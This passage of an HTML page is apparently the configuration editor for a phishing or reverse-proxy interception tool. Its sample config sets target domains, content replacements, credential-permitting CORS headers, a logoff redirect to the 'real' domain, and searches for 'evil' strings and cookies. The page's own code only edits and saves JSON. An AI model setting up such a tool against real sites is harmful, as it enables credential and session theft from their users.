        ;
        var dummy_config = {
            "primary_target": "target1.com",
            "secondary_target": "target2.com",
            "wwwroot": "mydir",
            "replacements": {
                "string_to_be_replaced": "replacement_string"
            },
            "custom_headers": {
                "Access-Control-Allow-Origin": "*",
                "Access-Control-Allow-Credentials": "true"
            },
            "snitch": {
                "snitch_string": "Logoff",
                "redirect_url": "https://real.domain.com/index.html"
            },
            "url_search": {
                "switch": true,
                "search_string": "evil_string",
                "set_cookie": false
            },
            "cookie_search": {
                "switch": false,
                "cookie": "evil_cookie",
                "cookie_value": "evil_value"
            }
        };
    </script>
    <script>
        function setTextArea() {
            document.getElementById('config').value = JSON.stringify(config, null, 4);
        }

        function addDomain() {
            config = JSON.parse(document.getElementById('config').value);
            config["new_domain.com"] = dummy_config;
            setTextArea();
        }

        function prettyPrint() {
            try {
                config = JSON.parse(document.getElementById('config').value);
                setTextArea();
		//update the data for the POST if we save changes
                document.getElementById('config_input').value = JSON.stringify(config);
            } catch (err) {
                alert("JSON parsing error: look for <ERROR> in config");
                var position = parseInt(err.toString().match(/[0-9]+/));
                var config_text = document.getElementById('config').value;
                config_text = config_text.slice(0, position) + '<ERROR>' + config_text.slice(position);
                document.getElementById('config').value = config_text;
            }
        }

        function setPostInput() {
	    try {
                document.getElementById('config_input').value = JSON.stringify(JSON.parse(document.getElementById('config').value));
	    } catch(err) {
		//who cares
	    }
        }

        function pageSetup() {
            document.getElementById('config_form').action = window.location.href;
            setTextArea();
            setPostInput();
	}

        document.addEventListener("DOMContentLoaded", function(event) { 
          var favIcon = "AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEqIAP9KiAD/SogA/0B5AP9AeQD/QHkA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAArTgB8SogA/0qIAP9KiAD/SogA/0qIAP9AeQD/QHkA/0B5AP9AeQD/QHkA/1SZAP8AAAAAAAAAAAAAAABeqwD/XqsA/0qIAP9KiAD/SogA/0qIAP9KiAD/QHkA/0B5AP9AeQD/QHkA/0B5AP9UmQD/VJkA/wAAAAAAAAAAXqsA/16rAP9eqwD/XqsA/16rAP9KiAD/SogA/0B5AP9AeQD/VJkA/1SZAP9UmQD/VJkA/1CSAP8AAAAAAAAAAF6rAP9eqwD/XqsA/16rAP9eqwD/XqsA/1miAP9UmQD/VJkA/1SZAP9UmQD/VJkA/1SZAP9UmQD/AAAAAAAAAABeqwD/XqsA/wDN//8Azf//AM3//16rAP9AeQD/I1wA/1SZAP8Asev/ALHr/wCx6/9UmQD/VJkA/wAAAAAAAAAAXqsA/wDN//8Azf//AM3//wDN//8Azf//XqsA/1SZAP8Asev/ALHr/wCx6/8AsOr/ALHr/1SZAP8AAAAAAAAAAADN//8Azf//AM3//0BAQP8Azf//AM3//16rAP9UmQD/ALHr/wCx6/8pKSn/ALHr/wCx6/8Asev/AAAAAAAAAAAAzf//AM3//wDN//9ERET/AM3//wDN//9eqwD/VJkA/wCx6/8Asev/JiYm/wCx6/8Asev/ALHr/wAAAAAAAAAAAM3//wDN//8Azf//AM3//wDN//8Azf//XqsA/1SZAP8Asev/ALHr/wCx6/8Asev/ALHr/wCx6/8AAAAAAAAAAAAAAAAAzf//AM3//wDN//8Azf//AM3//16rAP9UmQD/BLDg/wCx6/8Asev/ALHr/wCx6/8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZIALXqsA/16rAP9eqwD/T5EA/1SZAP9UmQD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABeqwD/XqsA/1SZAP9PkQD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXqsA/16rAP9UmQD/VJkA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABeqwD/VJkA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXqsA/1SZAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+B8AAOADAACAAQAAgAEAAIABAACAAQAAgAEAAIABAACAAQAAgAEAAMADAAD4HwAA/D8AAPw/AAD+fwAA/n8AAA=="
          var docHead = document.getElementsByTagName('head')[0];       
          var newLink = document.createElement('link');
          newLink.rel = 'shortcut icon';
          newLink.href = 'data:image/png;base64,'+favIcon;
          docHead.appendChild(newLink);
        });


    </script>
</head>
<style>
    #config {
        margin: auto;
        display: block;
        min-height: 1000px;
        width: 90%;
        font-size: 16px;
    }
    
    .button {
        padding: 10px;
        margin: auto;
        display: block;
        font-size: 16px;
    }

    #cofig_form {
        padding: 10px;
        margin: auto;
        display: block;
        font-size: 16px;
    }
</style>

<body onload="pageSetup()">
    <textarea id="config" form="config_form" onkeyup="setPostInput();"></textarea>
    <button class="button" type="button" onclick="addDomain()">Add Domain</button>
    <button class="button" type="button" onclick="prettyPrint()">Validate JSON</button>
    <form action="" id="config_form" method="post">
        <input type="hidden" value="" name="config" id="config_input">
        <input type="submit" value="Save Changes">
    </form>
</body>

</html>
